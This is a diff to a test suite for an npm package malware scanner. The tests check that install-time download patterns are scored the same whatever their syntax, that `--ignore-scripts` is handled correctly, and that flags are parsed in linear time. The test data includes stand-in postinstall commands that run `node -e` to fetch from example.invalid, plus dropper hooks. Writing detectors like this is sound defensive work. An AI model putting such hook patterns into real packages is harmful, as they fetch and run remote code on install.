@@ -1,7 +1,7 @@
 // Ways a package with a clearly malicious pattern scored higher than the same pattern written another way: a payload
 // named like a document, an `npm run` with flags or quotes, an inline eval after other flags. Payloads are stand-ins.
 import { describe, expect, test } from "bun:test";
-import { analyze, expandHooks, finalize, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
+import { analyze, expandHooks, finalize, gypCommands, isInlineDownload, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
 
 function entry(path: string, text: string): TarEntry {
   const data = new TextEncoder().encode(text);
@@ -59,11 +59,47 @@ describe("node's inline-eval flag is recognised after other flags", () => {
   const code = "\"require('https').get('https://example.invalid/x')\"";
   const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});
 
-  for (const cmd of [`node --no-warnings -e ${code}`, `node -pe ${code}`, `node --input-type=module -e ${code}`, `nodejs -e ${code}`, `echo --result=$(node -e ${code})`, `echo "$(node --no-warnings -e ${code})"`]) {
+  for (const cmd of [`node --no-warnings -e ${code}`, `node -pe ${code}`, `node --input-type=module -e ${code}`, `nodejs -e ${code}`, `echo --result=$(node -e ${code})`, `echo "$(node --no-warnings -e ${code})"`, `echo $(node -e ${code})`, `x=$( node -e ${code} )`, `echo \`node -e ${code}\``, `echo --result=\`node -e ${code}\``]) {
     test(cmd.slice(0, 40), () => {
-      expect(scoreOf({ scripts: { postinstall: cmd } }, {}).score).toBe(plain.score);
+      const r = scoreOf({ scripts: { postinstall: cmd } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBe(plain.score);
     });
   }
+});
+
+describe("npm run --ignore-scripts runs the script but not its pre and post scripts", () => {
+  // npm docs, config `ignore-scripts`: `npm run`, `npm test` and the like still run their script, "but they will not run
+  // any pre- or post-scripts", so a dropper in those never runs; npm 9 run locally printed only the named script's output
+  const files = { "index.js": "module.exports = 1;\n" };
+  const withHooks = (postinstall: string, name: string) => ({ scripts: { postinstall, [name]: "node index.js", [`pre${name}`]: DROPPER, [`post${name}`]: DROPPER } });
+  const clean = scoreOf({ scripts: { postinstall: "npm run payload", payload: "node index.js" } }, files);
+
+  for (const cmd of ["npm run --ignore-scripts payload", "npm --ignore-scripts run payload", "npm run --ignore-scripts=true payload", "npm run-script --ignore-scripts 'payload'", "npm --ignore-scripts test"]) {
+    test(`postinstall: ${cmd}`, () => {
+      const r = scoreOf(withHooks(cmd, cmd.endsWith("test") ? "test" : "payload"), files);
+
+      expect(r.ids).not.toContain("install-download");
+      expect(r.score).toBe(clean.score);
+    });
+  }
+
+  // npm runs them here: no flag, the flag cleared by a later one or by `=false`, or a value npm refuses (then nothing runs)
+  for (const cmd of ["npm run payload", "npm run --ignore-scripts=false payload", "npm run --ignore-scripts --no-ignore-scripts payload", "npm run --ignore-scripts=1 payload", "yarn run --ignore-scripts payload"]) {
+    test(`postinstall: ${cmd} still reads them`, () => {
+      const r = scoreOf(withHooks(cmd, "payload"), files);
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBeLessThan(SCORE_FLOOR);
+    });
+  }
+
+  test("the same script run again without the flag still reads them", () => {
+    const r = scoreOf(withHooks("npm run --ignore-scripts payload && npm run payload", "payload"), files);
+
+    expect(r.ids).toContain("install-download");
+  });
 });
 
 describe("the flags a command may carry are read in linear time", () => {
@@ -77,4 +113,32 @@ describe("the flags a command may carry are read in linear time", () => {
       expect(performance.now() - started).toBeLessThan(500);
     });
   }
+
+  // the review's input, 288 KB of `--conditions=node` that made the old regex take about 5 s, and twice that: the inline
+  // eval check alone, then the whole scorer
+  for (const n of [16_000, 32_000]) {
+    const cmd = `node ${"--conditions=node ".repeat(n)}x`;
+
+    test(`isInlineDownload on ${cmd.length} chars of flags`, () => {
+      const started = performance.now();
+
+      expect(isInlineDownload(cmd)).toBe(false);
+      expect(performance.now() - started).toBeLessThan(100);
+    });
+  }
+
+  test("the scorer on 288 KB of flags", () => {
+    const started = performance.now();
+
+    scoreOf({ scripts: { postinstall: `node ${"--conditions=node ".repeat(16_000)}x` } }, {});
+    expect(performance.now() - started).toBeLessThan(1_000);
+  });
+
+  test("a 4 MiB binding.gyp command is read without a list of its words", () => {
+    const [cmd = ""] = gypCommands(`{ 'targets': [{ 'sources': ['<!(echo ${"a ".repeat(2 * 1024 * 1024)})'] }] }`);
+    const started = performance.now();
+
+    expect(isInlineDownload(cmd)).toBe(false);
+    expect(performance.now() - started).toBeLessThan(100);
+  });
 });
